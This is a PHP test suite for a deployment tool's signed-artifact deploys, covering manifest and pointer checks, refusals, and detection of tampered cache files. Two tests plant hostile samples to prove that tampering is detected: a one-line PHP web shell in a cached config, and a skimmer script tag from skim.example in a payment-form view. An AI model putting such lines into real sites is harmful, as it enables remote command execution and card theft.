<?php

namespace Slipstream\Tests\Feature;

use RuntimeException;
use Slipstream\Deploy\DefaultHooks;
use Slipstream\Deploy\Deployer;
use Slipstream\Models\Deployment;
use Slipstream\Models\DeploymentEvent;
use Slipstream\Models\Server;
use Slipstream\Release\Core\ArtifactRefused;
use Slipstream\Release\ReleaseVerifier;
use Slipstream\Tests\Support\ArtifactFixture;
use Slipstream\Tests\Support\RecordingDeployer;
use Slipstream\Tests\TestCase;

/**
 * The real deployer, in artifact mode, against a store on disk: the whole
 * chain from pointer to swapped release, and every way it refuses. The swap
 * is a symlink move, so this runs on POSIX (under WSL here).
 */
class ArtifactDeployTest extends TestCase
{
    protected const OLD = 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';

    protected ArtifactFixture $fixture;

    protected function setUp(): void
    {
        parent::setUp();

        if (DIRECTORY_SEPARATOR === '\\') {
            $this->markTestSkipped('needs symlinks and mv -T.');
        }

        $this->fixture = (new ArtifactFixture)->configure()->writeCheckout()->package();
        $this->fixture->publish();
        config()->set('slipstream.services.restart_fpm', false);
        Server::query()->create(['server_name' => 'test-node', 'enabled' => true, 'paused' => false]);

        // What a node has before: an older release, live.
        $old = $this->fixture->appRoot.'/releases/20261001_000000_eeeeeee';
        mkdir($old, 0777, true);
        file_put_contents($old.'/RELEASE_SHA', self::OLD."\n");
        touch($old, time() - 3600);
        symlink($old, $this->fixture->appRoot.'/current');

        // The stored defaults, "Build assets" among them, as every install has.
        DefaultHooks::seed();
    }

    protected function tearDown(): void
    {
        // Unset when setUp() skipped before making it.
        if (isset($this->fixture)) {
            $this->fixture->remove();
        }

        parent::tearDown();
    }

    public function test_a_signed_artifact_deploys_end_to_end_without_git_composer_or_npm(): void
    {
        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production']);

        $deployer->run();

        $deployment->refresh();
        $this->assertSame(Deployment::STATUS_DEPLOYED, $deployment->status);
        $live = realpath($this->fixture->appRoot.'/current');
        $this->assertSame($this->fixture->sha, trim((string) file_get_contents($live.'/RELEASE_SHA')));
        $this->assertFileExists($live.'/.slipstream/manifest.json');
        $this->assertFileExists($live.'/.slipstream/manifest.sig');
        $this->assertFileExists($live.'/.slipstream/pointer.json');
        $this->assertFileExists($live.'/vendor/slipstream/slipstream/composer.json');
        $this->assertTrue(is_link($live.'/.env'), 'shared links are made as always');
        $this->assertTrue(app(ReleaseVerifier::class)->verify($live)['ok'], 'the live release matches its manifest');

        foreach ($deployer->commands() as $command) {
            $command = str_replace(Deployer::ARTIFACT_GUARD."\n", '', $command);
            foreach (['git ', 'composer', 'npm'] as $tool) {
                $this->assertStringNotContainsString($tool, $command, "a node in artifact mode ran {$tool}: {$command}");
            }
        }
        $this->assertSame([
            'sequence' => $this->fixture->pointer->sequence,
            'manifest_sha256' => $this->fixture->pointer->manifestSha256,
            'key_id' => 'test-key',
            'bound' => true,
            // The hash of the cache record, kept off the release's disk.
            'baseline_sha256' => hash_file('sha256', $live.'/.slipstream/generated.json'),
        ], $deployment->meta['artifact']);
        $this->assertSame([], glob($this->fixture->appRoot.'/releases/.incoming-*'), 'nothing left staged');
    }

    public function test_a_poll_deploy_fetches_the_manifest_its_pointer_named_and_no_other(): void
    {
        $recorded = $this->recorded();
        // The same commit republished with another manifest (what 0.6.0
        // allowed): the deploy started from the first pointer refuses it.
        $this->fixture->republishManifest(fn (array $m) => ['built_at' => '2026-10-20T00:00:00Z'] + $m);

        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $recorded]);
        try {
            $deployer->run();
            $this->fail('fetched a manifest the pointer it started from did not name');
        } catch (ArtifactRefused $e) {
            $this->assertSame('manifest', $e->stage);
            $this->assertStringContainsString("the manifest's hash is not the one the pointer names", $e->reason);
        }
    }

    public function test_a_pointer_that_moved_to_another_commit_supersedes_the_deploy(): void
    {
        $recorded = $this->recorded();
        $first = $this->fixture->sha;
        $this->fixture->publishSecond();

        [$deployer, $deployment] = $this->deployer($first, ['poll_ref' => 'branch:production', 'pointer' => $recorded]);
        $deployer->run();

        $deployment->refresh();
        $this->assertSame(Deployment::STATUS_SUPERSEDED, $deployment->status, 'not failed: back-off counts only failures');
        $this->assertStringContainsString('moved to bbbbbbb', (string) $deployment->failure_reason);
        $this->assertSame(self::OLD, trim((string) file_get_contents($this->fixture->appRoot.'/current/RELEASE_SHA')));
        $this->assertSame(['20261001_000000_eeeeeee'], array_map('basename', glob($this->fixture->appRoot.'/releases/*') ?: []));
    }

    public function test_a_rollback_published_while_the_deploy_builds_wins_before_the_swap(): void
    {
        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $this->recorded()]);
        $deployer->runner->during = function (string $command) {
            if (str_contains($command, 'slipstream:healthcheck')) {
                $this->fixture->publishSecond(); // CI moves the ref meanwhile
            }
        };

        $deployer->run();

        $this->assertSame(Deployment::STATUS_SUPERSEDED, $deployment->refresh()->status);
        $this->assertSame(self::OLD, trim((string) file_get_contents($this->fixture->appRoot.'/current/RELEASE_SHA')), 'the release the ref left never went live');
        $this->assertSame(['20261001_000000_eeeeeee'], array_map('basename', glob($this->fixture->appRoot.'/releases/*') ?: []), 'and is removed, not kept');
    }

    public function test_a_statement_built_for_another_ref_is_refused(): void
    {
        $this->fixture->republishManifest(fn (array $m) => ['ref' => 'refs/heads/staging'] + $m);

        $this->assertRefused('statement', 'it was built for refs/heads/staging; this node deploys refs/heads/production');
    }

    public function test_a_commit_no_pointer_names_deploys_unbound_and_says_so(): void
    {
        config()->set('slipstream.audit.enabled', true);
        \Illuminate\Support\Facades\Log::spy();
        $this->fixture->publishSecond(str_repeat('b', 40));
        $this->fixture->publishSecond(str_repeat('c', 40)); // pointer c, previous b; a is named by nothing

        [$deployer, $deployment] = $this->deployer(str_repeat('a', 40));
        $deployer->run();

        $deployment->refresh();
        $this->assertSame(Deployment::STATUS_DEPLOYED, $deployment->status);
        $this->assertFalse($deployment->meta['artifact']['bound']);
        $this->assertTrue(DeploymentEvent::query()->where('deployment_id', $deployment->id)->where('message', 'like', '%No pointer names aaaaaaa%')->exists());
        \Illuminate\Support\Facades\Log::shouldHaveReceived('info')->with('slipstream.artifact.verified', \Mockery::on(fn (array $c) => $c['bound'] === false && $c['sha'] === str_repeat('a', 40)))->once();

        // The pointer's previous, by commit: vouched for, so bound.
        [$deployer, $deployment] = $this->deployer(str_repeat('b', 40));
        $deployer->run();
        $this->assertTrue($deployment->refresh()->meta['artifact']['bound']);
    }

    public function test_the_generated_caches_are_recorded_just_before_the_swap(): void
    {
        config()->set('slipstream.audit.enabled', true);
        \Illuminate\Support\Facades\Log::spy();
        $this->fixture->writeCheckout([], <<<'PHP'
<?php
return [['name' => 'Optimize', 'step' => 'composer', 'script' => 'printf "<?php return [];" > bootstrap/cache/config.php']];
PHP)->package(str_repeat('f', 40)); // a new commit: a published release is never replaced
        $this->fixture->publish();

        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $this->recorded()]);
        $deployer->runner->passthrough[] = 'bootstrap/cache/config.php';
        $deployer->run();

        $live = realpath($this->fixture->appRoot.'/current');
        $baseline = \Slipstream\Release\Core\Baseline::fromJson((string) file_get_contents($live.'/.slipstream/generated.json'));
        $this->assertSame([hash('sha256', '<?php return [];'), 16], $baseline['bootstrap/cache/config.php']);
        \Illuminate\Support\Facades\Log::shouldHaveReceived('info')->with('slipstream.artifact.baseline', \Mockery::on(fn (array $c) => $c['files'] === ['bootstrap/cache/config.php' => hash('sha256', '<?php return [];')]))->once();
        $this->assertTrue(app(ReleaseVerifier::class)->verify($live)['ok']);

        file_put_contents($live.'/bootstrap/cache/config.php', '<?php system($_GET["c"]); return [];');
        $this->assertSame(['bootstrap/cache/config.php'], app(ReleaseVerifier::class)->verify($live)['generated']);
    }

    public function test_every_view_is_compiled_into_the_release_before_the_record(): void
    {
        config()->set('slipstream.audit.enabled', true);
        \Illuminate\Support\Facades\Log::spy();
        // A release whose Slipstream has slipstream:views.
        $this->fixture->writeCheckout(['vendor/slipstream/slipstream/src/Console/Commands/ViewsCommand.php' => "<?php\n"])->package(str_repeat('f', 40));
        $this->fixture->publish();

        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $this->recorded()]);
        $deployer->runner->during = function (string $command) use ($deployer): void {
            if (str_contains($command, 'artisan slipstream:views')) {
                // What the command leaves: the views, compiled in the release.
                $release = (string) end($deployer->runner->commands)['cwd'];
                @mkdir($release.'/bootstrap/cache/views', 0777, true);
                file_put_contents($release.'/bootstrap/cache/views/0a1b.php', '<form><?php echo e($title); ?></form>');
            }
        };
        $deployer->run();

        $live = realpath($this->fixture->appRoot.'/current');
        $this->assertCount(1, array_filter($deployer->commands(), fn (string $command) => str_contains($command, 'artisan slipstream:views')));
        $record = \Slipstream\Release\Core\Baseline::parse((string) file_get_contents($live.'/.slipstream/generated.json'));
        $this->assertSame(2, $record['format']);
        $this->assertArrayHasKey('bootstrap/cache/views/0a1b.php', $record['files'], 'compiled before the record was taken');
        \Illuminate\Support\Facades\Log::shouldHaveReceived('info')->with('slipstream.artifact.baseline', \Mockery::on(
            fn (array $c) => $c['views'] === 1 && $c['record_sha256'] === hash_file('sha256', $live.'/.slipstream/generated.json'),
        ))->once();
        $this->assertTrue(app(ReleaseVerifier::class)->verify($live)['ok']);

        // The payment frame's compiled view, edited after the swap.
        file_put_contents($live.'/bootstrap/cache/views/0a1b.php', '<form><?php echo e($title); ?></form><script src="https://skim.example/x.js"></script>');
        $this->assertSame(['bootstrap/cache/views/0a1b.php'], app(ReleaseVerifier::class)->verify($live)['generated']);
    }

    public function test_a_release_whose_slipstream_predates_the_views_command_deploys_without_it(): void
    {
        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $this->recorded()]);
        $deployer->run();

        $this->assertSame(Deployment::STATUS_DEPLOYED, $deployment->refresh()->status);
        $this->assertSame([], array_values(array_filter($deployer->commands(), fn (string $command) => str_contains($command, 'slipstream:views'))));
    }

    public function test_a_download_left_behind_by_a_killed_deploy_is_pruned(): void
    {
        $stale = $this->fixture->appRoot.'/releases/.incoming-20260101_000000_ddddddd.tar.gz';
        file_put_contents($stale, 'half a download');
        touch($stale, time() - 3 * 3600);

        [$deployer] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $this->recorded()]);
        $deployer->run();

        $this->assertFileDoesNotExist($stale);
    }

    public function test_a_hooks_file_outside_the_release_is_refused(): void
    {
        config()->set('slipstream.hooks.file', '../../hooks.php');
        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $this->recorded()]);

        try {
            $deployer->run();
            $this->fail('loaded a hooks file from outside the release');
        } catch (RuntimeException $e) {
            $this->assertStringContainsString('leaves the release', $e->getMessage());
        }
        $this->assertSame(Deployment::STATUS_FAILED, $deployment->refresh()->status);
    }

    public function test_a_tampered_tarball_is_refused_and_nothing_is_swapped(): void
    {
        $this->fixture->tamperArchive();

        $this->assertRefused('archive', 'does not match the signed manifest');
    }

    public function test_a_bad_manifest_signature_is_refused_and_nothing_is_swapped(): void
    {
        $this->fixture->resignManifest($this->fixture->otherSigner());

        $this->assertRefused('statement', 'signature does not verify');
    }

    /**
     * The poller refuses a bad pointer before any deploy starts (no row:
     * ArtifactSourceTest). One that turns bad after a deploy started says
     * nothing about the pointer that deploy was started from, which was
     * checked when it was read.
     */
    public function test_a_pointer_that_turns_bad_mid_deploy_does_not_stop_it(): void
    {
        $recorded = $this->recorded();
        $this->fixture->resignPointer($this->fixture->otherSigner());

        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $recorded]);
        $deployer->run();

        $this->assertSame(Deployment::STATUS_DEPLOYED, $deployment->refresh()->status, 'bound to the manifest the verified pointer named');
        $this->assertTrue($deployment->meta['artifact']['bound']);
    }

    public function test_garbage_written_to_the_pointer_after_the_migrations_does_not_abort_the_swap(): void
    {
        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $this->recorded()]);
        $deployer->runner->during = function (string $command) {
            if (str_contains($command, 'slipstream:healthcheck')) {
                \Illuminate\Support\Facades\Storage::disk('artifacts')->put('app/refs/heads/production.json', '{"not":"a pointer"}');
            }
        };

        $deployer->run();

        $this->assertSame(Deployment::STATUS_DEPLOYED, $deployment->refresh()->status);
        $this->assertSame($this->fixture->sha, trim((string) file_get_contents($this->fixture->appRoot.'/current/RELEASE_SHA')));
    }

    public function test_a_stale_download_is_swept_even_when_the_deploy_then_fails(): void
    {
        $stale = $this->fixture->appRoot.'/releases/.incoming-20260101_000000_ddddddd';
        mkdir($stale);
        touch($stale, time() - 3 * 3600);
        $this->fixture->tamperArchive();

        $this->assertRefused('archive', 'does not match the signed manifest');
        $this->assertDirectoryDoesNotExist($stale);
    }

    public function test_a_file_whose_hash_does_not_match_the_manifest_is_refused_and_nothing_is_swapped(): void
    {
        $this->fixture->publishWithFileHashMismatch();

        $this->assertRefused('files', 'does not match the manifest');
    }

    public function test_an_artifact_built_for_a_newer_php_is_refused_and_an_older_one_only_warns(): void
    {
        $this->fixture->republishManifest(fn (array $m) => ['php' => '99.0.0'] + $m);
        $this->assertRefused('php', 'built for PHP 99.0; this node runs '.PHP_MAJOR_VERSION.'.'.PHP_MINOR_VERSION);

        $this->fixture->republishManifest(fn (array $m) => ['php' => '7.4.33'] + $m);
        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production']);
        $deployer->run();

        $this->assertSame(Deployment::STATUS_DEPLOYED, $deployment->refresh()->status);
        $this->assertTrue(DeploymentEvent::query()->where('deployment_id', $deployment->id)->where('message', 'like', '%Newer usually works%')->exists());
    }

    public function test_a_commit_deploys_by_its_own_signature_without_a_pointer(): void
    {
        $this->fixture->deletePointer();
        [$deployer, $deployment] = $this->deployer(substr($this->fixture->sha, 0, 8));

        $deployer->run();

        $this->assertSame(Deployment::STATUS_DEPLOYED, $deployment->refresh()->status);
        $this->assertSame($this->fixture->sha, $deployment->sha, 'the short sha was expanded');
        $this->assertNull($deployment->meta['artifact']['sequence']);
        $this->assertFalse($deployment->meta['artifact']['bound']);
        $this->assertFileDoesNotExist(realpath($this->fixture->appRoot.'/current').'/.slipstream/pointer.json');
    }

    public function test_webhook_mode_refuses_artifact_deploys_before_touching_the_store(): void
    {
        config()->set('slipstream.trigger.mode', 'webhook');
        [$deployer, $deployment] = $this->deployer($this->fixture->sha);

        try {
            $deployer->run();
            $this->fail('deployed an artifact in webhook mode');
        } catch (RuntimeException $e) {
            $this->assertStringContainsString('SLIPSTREAM_TRIGGER=poll', $e->getMessage());
        }

        $this->assertSame(Deployment::STATUS_FAILED, $deployment->refresh()->status);
        $this->assertSame([], glob($this->fixture->appRoot.'/releases/.incoming-*'));
    }

    public function test_a_failure_after_verification_keeps_the_release_for_inspection(): void
    {
        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production']);
        $deployer->runner->failOn = ['slipstream:healthcheck'];

        try {
            $deployer->run();
            $this->fail('deployed past a failing health check');
        } catch (RuntimeException) {
            $this->addToAssertionCount(1);
        }

        $this->assertSame(Deployment::STATUS_FAILED, $deployment->refresh()->status);
        $this->assertCount(1, glob($this->fixture->appRoot.'/releases/*.failed'), 'a verified release that failed later is kept');
        $this->assertSame(self::OLD, trim((string) file_get_contents($this->fixture->appRoot.'/current/RELEASE_SHA')));
    }

    /**
     * The pointer as the poller records it on the row it creates.
     *
     * @return array{sequence: int, manifest_sha256: string}
     */
    protected function recorded(): array
    {
        return ['sequence' => $this->fixture->pointer->sequence, 'manifest_sha256' => $this->fixture->pointer->manifestSha256];
    }

    protected function assertRefused(string $stage, string $reason): void
    {
        [$deployer, $deployment] = $this->deployer($this->fixture->sha, ['poll_ref' => 'branch:production', 'pointer' => $this->recorded()]);

        try {
            $deployer->run();
            $this->fail("deployed a release that should be refused at the {$stage} stage");
        } catch (ArtifactRefused $e) {
            $this->assertSame($stage, $e->stage);
            $this->assertStringContainsString($reason, $e->getMessage());
        }

        $deployment->refresh();
        $this->assertSame(Deployment::STATUS_FAILED, $deployment->status);
        $this->assertStringContainsString("Refusing artifact ({$stage})", (string) $deployment->failure_reason);
        $this->assertSame(self::OLD, trim((string) file_get_contents($this->fixture->appRoot.'/current/RELEASE_SHA')), 'nothing swapped');
        $this->assertSame(['20261001_000000_eeeeeee'], array_map('basename', glob($this->fixture->appRoot.'/releases/*') ?: []), 'no new release, nothing kept as .failed');
        $this->assertSame([], glob($this->fixture->appRoot.'/releases/.incoming-*'), 'the staging directory is gone');
        $this->assertSame([], glob($this->fixture->appRoot.'/releases/*.tar.gz'), 'no tarball left behind');
    }

    /**
     * @param  array<string, mixed>  $meta
     * @return array{0: RecordingDeployer, 1: Deployment}
     */
    protected function deployer(?string $sha, array $meta = []): array
    {
        $deployment = Deployment::query()->create([
            'server_name' => 'test-node', 'sha' => $sha, 'branch' => 'production',
            'trigger' => Deployment::TRIGGER_POLL, 'status' => Deployment::STATUS_PENDING, 'meta' => $meta ?: null,
        ]);

        $deployer = new RecordingDeployer($deployment);
        $deployer->runner->passthrough = ['mv -T'];

        return [$deployer, $deployment];
    }
}
